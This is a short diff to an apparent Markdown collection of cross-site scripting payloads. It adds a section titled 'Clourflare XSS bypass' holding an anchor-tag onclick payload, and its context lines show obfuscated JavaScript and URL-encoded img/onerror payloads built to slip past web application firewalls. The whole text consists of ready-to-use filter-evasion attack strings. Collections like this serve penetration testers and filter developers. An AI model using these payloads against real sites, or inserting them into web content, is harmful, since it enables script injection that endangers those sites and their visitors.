@@ -79,3 +79,8 @@ window&&=(window&&=opener||=alert)?.(1??0,)
 %22%3Cimg%2F**%2Fsrc%3D%22x%22%2F**%2Fonx%3D%22%22%2F**%2Fonerror%3D%22alert%60xss%60%22%3Ef9y60 --encoded
 "<img/**/src="x"/**/onx=""/**/onerror="alert`xss`">f9y60 --decoded
 ```
+
+## Clourflare XSS bypass
+```js
+<a"/onclick=(confirm)()>Click Here!
+```
